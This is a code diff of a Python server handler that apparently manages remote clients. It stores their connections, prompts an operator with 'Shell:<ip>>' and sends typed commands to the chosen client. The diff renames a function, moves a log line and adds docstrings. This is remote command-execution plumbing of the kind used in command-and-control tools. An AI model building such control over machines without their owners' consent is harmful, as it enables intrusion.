@@ -31,17 +31,17 @@ class Handler:
         :return: None
         """
         if request.request_method == "GET":
-            print("[+] Authentication succeed ->", addr)
             try:
                 RuntimeDatabase.idle_connections_lock.acquire()
                 RuntimeDatabase.idle_connections[addr[0]].close()  # Close previous socket
                 RuntimeDatabase.idle_connections_lock.release()
             except KeyError:  # New connection
+                print("[+] Authentication succeed ->", addr)
                 RuntimeDatabase.idle_connections_lock.release()
             RuntimeDatabase.idle_connections_lock.acquire()
             RuntimeDatabase.idle_connections[addr[0]] = client_sock
             RuntimeDatabase.idle_connections_lock.release()
-            Handler.handle_send_command(addr[0])
+            Handler.handle_execute_command(addr[0])
         if request.request_method == "POST":
             try:  # An other handler waiting for this request
                 session_id = request.request_headers['Cookie'].split("=")[1]
@@ -55,14 +55,25 @@ class Handler:
 
     @staticmethod
     def handle_cpr():
-        # TODO: It's require computer object- next sprint
+        """
+        This function is check that client is alive and refresh the socket
+        :return: alive or closed
+        :rtype: bool
+        """
+        # TODO: It's require Computer Object and Database- next sprint
         return True
 
     @staticmethod
-    def handle_send_command(ip_address):
+    def handle_execute_command(ip_address):
+        """
+        This function executes command on this ip address
+        :param ip_address: ip address
+        :type ip_address: str
+        :return: None (Temporary)
+        """
         if not Handler.handle_cpr():
             return
-        command = input("Shell> ")
+        command = input("Shell:" + ip_address + "> ")
         RuntimeDatabase.idle_connections_lock.acquire()
         client_socket = RuntimeDatabase.idle_connections[ip_address]
         RuntimeDatabase.idle_connections_lock.release()
